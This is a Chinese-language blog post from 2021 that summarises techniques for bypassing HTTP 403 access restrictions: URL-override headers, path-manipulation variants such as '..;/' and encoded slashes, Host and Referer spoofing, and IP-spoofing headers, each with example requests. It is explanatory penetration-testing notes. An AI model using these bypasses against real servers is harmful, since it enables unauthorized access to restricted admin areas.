@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>403绕过小结 - Lw0F</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lw0F,"> 
+    <meta name="description" content="0x00 前言：近期浏览到关于403绕过的技巧文章（https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ）
+饶有兴致，稍作小结，权当记录~
+0x01 改,"> 
+    <meta name="author" content="Lw0F"> 
+    <link rel="alternative" href="atom.xml" title="Lw0F" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lw0F</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://Lw0f.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">403绕过小结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">403绕过小结</h1>
+        <div class="stuff">
+            <span>一月 17, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期浏览到关于403绕过的技巧文章（<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ%EF%BC%89">https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ）</a></em></strong></p>
+<p><strong><em>饶有兴致，稍作小结，权当记录~</em></strong></p>
+<h2 id="0x01-改变请求方式："><a href="#0x01-改变请求方式：" class="headerlink" title="0x01 改变请求方式："></a><strong><em>0x01 改变请求方式：</em></strong></h2><h3 id="1、覆盖请求URL"><a href="#1、覆盖请求URL" class="headerlink" title="1、覆盖请求URL"></a><strong><em>1、覆盖请求URL</em></strong></h3><p><strong><em>尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制，通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。</em></strong></p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Original-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br><span class="line">	</span><br><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Rewrite-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、修改拓展名"><a href="#2、修改拓展名" class="headerlink" title="2、修改拓展名"></a><strong><em>2、修改拓展名</em></strong></h3><p><strong><em>基于扩展名，用于绕过403受限制的目录</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">site.com&#x2F;admin &#x3D;&gt; 403</span><br><span class="line">site.com&#x2F;admin&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;* &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;*&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;.&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin?? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin??? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2f&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2e&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%20&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%09&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%20admin%20&#x2F; &#x3D;&gt; 200</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-改变请求内容："><a href="#0x02-改变请求内容：" class="headerlink" title="0x02 改变请求内容："></a><strong><em>0x02 改变请求内容：</em></strong></h2><h3 id="1、修改-添加-Referer或HOST头"><a href="#1、修改-添加-Referer或HOST头" class="headerlink" title="1、修改/添加 Referer或HOST头"></a><strong><em>1、修改/添加 Referer或HOST头</em></strong></h3><p><strong><em>若服务器之间的业务访问控制是通过Referer或HOST头去关联，则可以尝试修改/添加 Referer 或HOST头去绕</em></strong>~</p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、添加代理IP"><a href="#2、添加代理IP" class="headerlink" title="2、添加代理IP"></a><strong><em>2、添加代理IP</em></strong></h3><p><strong><em>若应用是通过代理识别访问端IP限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制~</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般代理头姿势如下：</span><br><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">  X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-个人小结："><a href="#0x03-个人小结：" class="headerlink" title="0x03 个人小结："></a><strong><em>0x03 个人小结：</em></strong></h2><p><strong><em>就针对绕过而言，不管是改变请求方式还是请求内容，目的其实都是让请求看起来是合理的。（不是屁话么？）</em></strong></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=29577193'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=28445545'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1072983'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=41630480'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=29577189'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=19563212'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=498661'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%94%B9%E5%8F%98%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x01 改变请求方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%A6%86%E7%9B%96%E8%AF%B7%E6%B1%82URL"><span class="toc-number">2.1.</span> <span class="toc-text">1、覆盖请求URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9%E6%8B%93%E5%B1%95%E5%90%8D"><span class="toc-number">2.2.</span> <span class="toc-text">2、修改拓展名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%94%B9%E5%8F%98%E8%AF%B7%E6%B1%82%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">0x02 改变请求内容：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BF%AE%E6%94%B9-%E6%B7%BB%E5%8A%A0-Referer%E6%88%96HOST%E5%A4%B4"><span class="toc-number">3.1.</span> <span class="toc-text">1、修改&#x2F;添加 Referer或HOST头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86IP"><span class="toc-number">3.2.</span> <span class="toc-text">2、添加代理IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%AA%E4%BA%BA%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">0x03 个人小结：</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
